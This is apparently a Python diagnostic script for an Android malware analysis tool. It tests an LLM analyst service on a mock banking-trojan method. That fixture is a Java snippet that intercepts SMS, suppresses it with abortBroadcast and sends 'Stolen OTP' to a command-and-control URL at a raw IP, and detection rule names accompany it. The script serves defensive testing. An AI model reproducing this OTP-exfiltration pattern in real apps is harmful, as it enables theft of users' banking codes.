"""
LLM Connectivity & Schema Diagnostic Script (Person B - Block 0)
Validates LLM API connection, prompt reception, and frozen §9 JSON parsing.
"""

import json
import os
import sys
from pathlib import Path

# Add server directory to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from app.services.ai_analyst import AiAnalyst, SYSTEM_PROMPT, AiAnalysisResult
from app.services.method_selector import Method


def run_llm_diagnostic():
    print("=" * 60)
    print("  Argus - LLM Threat Intelligence & Schema Test")
    print("=" * 60)

    analyst = AiAnalyst()
    base_url = analyst.base_url
    model = analyst.model
    api_key = analyst.api_key

    print(f"Provider Base URL : {base_url}")
    print(f"Model Name        : {model}")
    print(f"API Key Configured: {'YES (sk-...)' if api_key else 'NO (running heuristic fallback)'}")
    print("-" * 60)

    # 1. Synthesize a mock suspicious method
    mock_method = Method(
        file_path="SmsInterceptor.java",
        class_name="com.fraud.banker.SmsInterceptor",
        name="onReceive",
        signature="public void onReceive(Context context, Intent intent)",
        code="""
        public void onReceive(Context context, Intent intent) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                // Intercept SMS
                abortBroadcast();
                sendToC2("http://185.220.101.5/collect", "Stolen OTP: " + smsBody);
            }
        }
        """,
        score=25,
        matched_rules=["CODE_SMS_ABORT", "IOC_RAW_IP"],
    )

    analyst = AiAnalyst()

    # 2. Test prompt generation
    prompt = analyst.build_user_prompt(
        package_name="com.fraud.banker",
        permissions=["android.permission.RECEIVE_SMS", "android.permission.INTERNET"],
        triggered_rules=[
            {"id": "PERM_SMS_INTERCEPTION_COMBO", "description": "SMS Interception capability", "weight": 30},
            {"id": "CODE_SMS_ABORT", "description": "abortBroadcast drops SMS", "weight": 22},
        ],
        static_iocs={"ips": ["185.220.101.5"], "domains": [], "urls": ["http://185.220.101.5/collect"]},
        methods=[mock_method],
    )
    print("[+] Successfully generated prompt context (length: %d chars)." % len(prompt))

    # 3. Test execution / Degraded path
    result, status = analyst.analyze(
        scan_id="diag_test",
        package_name="com.fraud.banker",
        permissions=["android.permission.RECEIVE_SMS", "android.permission.INTERNET"],
        triggered_rules=[{"id": "PERM_SMS_INTERCEPTION_COMBO", "weight": 30}],
        static_iocs={"ips": ["185.220.101.5"]},
        methods=[mock_method],
    )

    print(f"[+] Call completed with status: '{status}'")

    if result:
        print("[+] Validated live LLM output against frozen §9 schema:")
        print(json.dumps(result.model_dump(), indent=2))
    else:
        print("[*] Testing offline fallback heuristic engine...")
        fallback = analyst.generate_heuristic_analysis(
            package_name="com.fraud.banker",
            permissions=["android.permission.RECEIVE_SMS", "android.permission.INTERNET"],
            triggered_rules=[{"id": "PERM_SMS_INTERCEPTION_COMBO", "weight": 30}],
            methods=[mock_method],
        )
        print("[+] Fallback output adheres to frozen §9 schema:")
        print(json.dumps(fallback.model_dump(), indent=2))

    print("\n" + "=" * 60)
    print("  DIAGNOSTIC TEST PASSED (Zero crashes, frozen schema compliant)")
    print("=" * 60)


if __name__ == "__main__":
    run_llm_diagnostic()
